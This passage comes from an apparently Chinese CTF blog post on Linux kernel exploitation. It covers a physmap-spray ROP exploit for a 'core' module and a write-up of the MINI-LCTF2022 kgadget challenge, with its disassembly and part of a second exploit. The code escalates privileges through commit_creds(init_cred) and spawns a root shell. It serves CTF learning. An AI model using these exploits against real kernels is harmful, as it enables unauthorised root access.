class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"><span class="type">size_t</span> retn = <span class="number">0xFFFFFFFF81003E15</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbp_ret = <span class="number">0xFFFFFFFF812D71EF</span>;</span><br><span class="line"><span class="type">size_t</span> leave_ret = <span class="number">0xFFFFFFFF81037384</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> try_hit = <span class="number">0xffff880000000000</span>+<span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            pop_rbp_ret += offset;</span><br><span class="line">            leave_ret += offset;</span><br><span class="line">            retn += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">physmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error: open core&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] page_size %llx&quot;</span>, &amp;page_size);</span><br><span class="line">    <span class="type">size_t</span> *rop = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>)) &#123;</span><br><span class="line">        rop[idx++] = add_rsp_0xe8_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0xb</span>); idx++) &#123;</span><br><span class="line">        rop[idx] = retn;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++] = pop_rdi_ret;</span><br><span class="line">    rop[idx++] = init_cred;</span><br><span class="line">    rop[idx++] = commit_creds;</span><br><span class="line">    rop[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> *page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    physmap();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0x40</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0x50</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rbp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, leave_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="RetSpill"><a href="#RetSpill" class="headerlink" title="RetSpill"></a>RetSpill</h2><h3 id="利用思路-6"><a href="#利用思路-6" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a>MINI-LCTF2022 - kgadget</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>启动脚本如下：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure></div>

<p>没有开kaslr所以有了函数地址。但是开启了smep和smap保护，所以就不能ret2usr了，注意kvm64默认开启kpti保护（当然-append也写了）所以最后返回用户态时要进行页表切换。</p>
<p>写了一个字符驱动程序，其他函数都没啥用，就不放出来了。就 kgadget-ioctl或者函数有用，该函数会直接调用我们传入的地址处的函数。</p>
<p><strong>kgadget_ioctl</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:00000000000000F3 ; __int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)</span><br><span class="line">.text.unlikely:00000000000000F3 kgadget_ioctl   proc near               ; DATA XREF: __mcount_loc:0000000000000653↓o</span><br><span class="line">.text.unlikely:00000000000000F3                                         ; .data:kgadget_fo↓o</span><br><span class="line">.text.unlikely:00000000000000F3</span><br><span class="line">.text.unlikely:00000000000000F3 regs_addr       = qword ptr -20h</span><br><span class="line">.text.unlikely:00000000000000F3</span><br><span class="line">.text.unlikely:00000000000000F3 __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:00000000000000F3 cmd = rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000000F3 param = rdx                             ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000000F3                 call    __fentry__      ; PIC mode</span><br><span class="line">.text.unlikely:00000000000000F8                 push    rbp</span><br><span class="line">.text.unlikely:00000000000000F9                 mov     rbp, rsp</span><br><span class="line">.text.unlikely:00000000000000FC                 push    rbx</span><br><span class="line">.text.unlikely:00000000000000FD                 sub     rsp, 10h</span><br><span class="line">.text.unlikely:0000000000000101                 mov     rax, gs:28h</span><br><span class="line">.text.unlikely:000000000000010A                 mov     [rbp-10h], rax</span><br><span class="line">.text.unlikely:000000000000010E                 xor     eax, eax</span><br><span class="line">.text.unlikely:0000000000000110                 cmp     esi, 1BF52h; if esi == 114514 jmp loc_1a3</span><br><span class="line">.text.unlikely:0000000000000116                 jnz     loc_1A3</span><br><span class="line">.text.unlikely:000000000000011C                 mov     rbx, [param]; arg3 -&gt; rbx</span><br><span class="line">.text.unlikely:000000000000011F kgadget_ptr = rbx                       ; void (*)(void)</span><br><span class="line">.text.unlikely:000000000000011F                 mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:0000000000000126                 mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:0000000000000129                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000012E                 mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:0000000000000135                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp</span><br><span class="line">.text.unlikely:000000000000013E                 mov     rax, [rbp-18h] ; rsp -&gt; rax</span><br><span class="line">.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:0000000000000149                 add     rax, 1000h</span><br><span class="line">.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h ; rax -&gt; kstack_end</span><br><span class="line">.text.unlikely:0000000000000155                 lea     rdx, [rax-0A8h]</span><br><span class="line">.text.unlikely:000000000000015C                 mov     [rbp-18h], rdx</span><br><span class="line">.text.unlikely:0000000000000160 regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:0000000000000160                 mov     regs, 3361626E74747261h</span><br><span class="line">.text.unlikely:000000000000016A                 mov     [rax-0A8h], rdx; 3361626E74747261h -&gt; pt_regs</span><br><span class="line">.text.unlikely:0000000000000171                 mov     [rax-0A0h], rdx</span><br><span class="line">.text.unlikely:0000000000000178                 mov     [rax-98h], rdx</span><br><span class="line">.text.unlikely:000000000000017F                 mov     [rax-90h], rdx</span><br><span class="line">.text.unlikely:0000000000000186                 mov     [rax-88h], rdx</span><br><span class="line">.text.unlikely:000000000000018D                 mov     [rax-80h], rdx</span><br><span class="line">.text.unlikely:0000000000000191                 mov     [rax-70h], rdx</span><br><span class="line">.text.unlikely:0000000000000195                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000019A                 call    __x86_indirect_thunk_rbx ;PIC mode ;call rbx</span><br><span class="line">.text.unlikely:000000000000019F                 xor     eax, eax</span><br><span class="line">.text.unlikely:00000000000001A1                 jmp     short loc_1B3</span><br><span class="line">.text.unlikely:00000000000001A3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text.unlikely:00000000000001A3</span><br><span class="line">.text.unlikely:00000000000001A3 loc_1A3:                                ; CODE XREF: kgadget_ioctl+23↑j</span><br><span class="line">.text.unlikely:00000000000001A3 __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:00000000000001A3 cmd = rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:00000000000001A3 param = rdx                             ; unsigned __int64</span><br><span class="line">.text.unlikely:00000000000001A3                 mov     __file, offset unk_420</span><br><span class="line">.text.unlikely:00000000000001AA                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:00000000000001AF                 or      rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text.unlikely:00000000000001B3</span><br><span class="line">.text.unlikely:00000000000001B3 loc_1B3:                                ; CODE XREF: kgadget_ioctl+AE↑j</span><br><span class="line">.text.unlikely:00000000000001B3                 mov     rcx, [rbp-10h]</span><br><span class="line">.text.unlikely:00000000000001B7                 xor     rcx, gs:28h</span><br><span class="line">.text.unlikely:00000000000001C0                 jz      short loc_1C7</span><br><span class="line">.text.unlikely:00000000000001C2                 call    __stack_chk_fail ; PIC mode</span><br><span class="line">.text.unlikely:00000000000001C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text.unlikely:00000000000001C7</span><br><span class="line">.text.unlikely:00000000000001C7 loc_1C7:                                ; CODE XREF: kgadget_ioctl+CD↑j</span><br><span class="line">.text.unlikely:00000000000001C7                 pop     rdx</span><br><span class="line">.text.unlikely:00000000000001C8                 pop     rcx</span><br><span class="line">.text.unlikely:00000000000001C9                 pop     rbx</span><br><span class="line">.text.unlikely:00000000000001CA                 pop     rbp</span><br><span class="line">.text.unlikely:00000000000001CB                 retn</span><br><span class="line">.text.unlikely:00000000000001CB kgadget_ioctl   endp</span><br></pre></td></tr></table></figure></div>

<p>不过根据输出他提示信息， pt_regs 中只有 r8 和 r9 寄存器可以使用，寄存器还有 r11 和 rcx 的值没有被覆盖，但调试时发现其也会被覆盖。</p>
<h3 id="利用思路-7"><a href="#利用思路-7" class="headerlink" title="利用思路"></a>利用思路</h3><p>这题主要思路如下：</p>
<ol>
<li><p>使用 mmap 喷射大量内存，并在里面写上rop链。</p>
</li>
<li><p>将try_hit的地址传给rdx寄存器，利用kgadget_ioctl去call rbx。</p>
</li>
<li><p>完成栈迁移，执行提权代码。</p>
</li>
</ol>
<p>返回用户空间在使用 <code>swapgs_restore_regs_and_return_to_usermode</code>  函数时应该注意，前面 pop 完寄存器之后除 iretq 需要的寄存器还剩 orig_rax 和 rdi ，为了缩短 rop 的长度，可以直接  retn 到 <code>swapgs_restore_regs_and_return_to_usermode + 27;</code>，不过 rop 接下来还要有 16 字节的填充来表示 orig_rax 和 rdi 的位置。</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error: open kgadget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> *rop = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>)) &#123;</span><br><span class="line">        rop[idx++] = <span class="number">0xffffffff810737fe</span>;<span class="comment">// add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">11</span>); idx++) &#123;</span><br><span class="line">        rop[idx] = <span class="number">0xffffffff8108c6f1</span>;<span class="comment">// ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff8108c6f0</span>;<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff82a6b700</span>;<span class="comment">// init_cred</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff810c92e0</span>;<span class="comment">// commit_creds</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;<span class="comment">// swapgs_restore_regs_and_return_to_usermode + 27;</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) 